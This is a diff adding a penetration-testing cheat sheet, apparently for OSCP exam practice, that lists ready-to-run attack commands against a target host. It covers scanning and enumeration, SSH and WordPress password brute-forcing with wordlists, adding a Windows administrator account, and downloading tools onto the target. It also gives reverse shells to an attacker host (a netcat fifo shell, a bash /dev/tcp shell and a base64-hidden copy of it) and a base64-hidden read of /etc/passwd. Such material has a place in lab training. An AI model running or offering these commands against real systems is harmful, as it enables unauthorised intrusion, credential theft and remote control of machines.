@@ -1,0 +1,82 @@
+# Create OSCP IP List
+vi /root/Desktop/oscplist.txt
+
+# AutoRecon
+cd AutoRecon/src/autorecon/
+python3 autorecon.py 192.168.44.1
+python3 autorecon.py -t /root/Desktop/oscplist.txt
+
+# NMAP
+nmap -sU -sV -vv -oA quick_udp 192.168.44.1
+nmap -sU -O -p- -oA udp 192.168.44.1
+nmap -sC -sV -p- 192.168.44.1
+nmap -p- -vv --script vuln,discovery 192.168.44.1
+
+# Udp port check
+nc -z -v -u 192.168.44.1 137
+192.168.1.99: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.1.99] 137 (netbios-ns) open
+
+# PORT 111
+nmap -sSUC -p111 192.168.44.1
+
+# SMB ENUM
+enum4linux 192.168.44.1
+smbclient //192.168.44.1/anonymous -I 192.168.44.1
+smbclient //192.168.44.1/alex -I 192.168.44.1 -U alex
+smb: \> get proof.txt
+
+# HTTP ENUM DIR
+gobuster dir -u http://192.168.44.1 -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html
+gobuster dir -u http://192.168.44.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+nikto -host 192.168.44.1 -port 80
+
+# WORDPRESS
+wpscan --url 192.168.44.1 -e vp
+wpscan --url 192.168.44.1 -e p t u --passwords /usr/share/wordlists/metasploit/password.lst --usernames admin
+wpscan --url 192.168.44.1 -e p t u --passwords /usr/share/wordlists/rockyou.txt --usernames admin
+
+# REMOTE DESKTOP COMMAND
+rdesktop -u administrator -p password 192.168.44.1
+
+# CREATE USER Windows
+net user Michael hello123 /add
+net localgroup administrators username /add
+
+# HASH IDENTIFY
+strings Safe_Password.jpg 
+root@darklite:~/Hash-Identifier# python Hash_ID.py
+root@darklite:~/findmyhash# python findmyhash.py MD5 -h 242c23ea412530C7d94b77a7a978c176
+root@kali:~/Image-ExifTool-8.80# ./exiftool /root/Desktop/Safe_Password.jpg 
+
+# Create Word List
+crunch 10 10 -t ,%Curtains > curtains_wordlist.txt
+hydra -l RickSanchez -P curtains_wordlist.txt ssh://192.168.44.1 -s 22222
+
+# Set HTTP URL to get shell
+python2 -m SimpleHTTPServer 80
+
+# [Download file windows](https://stackoverflow.com/questions/4619088/windows-batch-file-file-download-from-a-url)
+powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.example.com/package.zip', 'package.zip')"
+powershell -Command "Invoke-WebRequest http://www.example.com/package.zip -OutFile package.zip"
+bitsadmin /transfer mydownloadjob /download /priority FOREGROUND "http://example.com/File.zip" "C:\Downloads\File.zip"
+
+# Download file Linux
+wget http://192.168.117.129/Linux_Exploit_Suggester.pl
+wget --no-passivw-ftp -m ftp://anonymous:anonymous@10.10.10.1
+
+# Set Listening Port
+nc -nlvp 443
+
+# Reverse Shell
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.117.129 443 >/tmp/f
+bash -i >& /dev/tcp/192.168.117.129/443 0>&1
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNy4xMjkvNDQzIDA+JjE= | base64 -d | bash
+
+
+# cat /etc/passwd
+cat /etc/passwd
+grep '[a-zA-Z0-9]' /etc/passwd
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
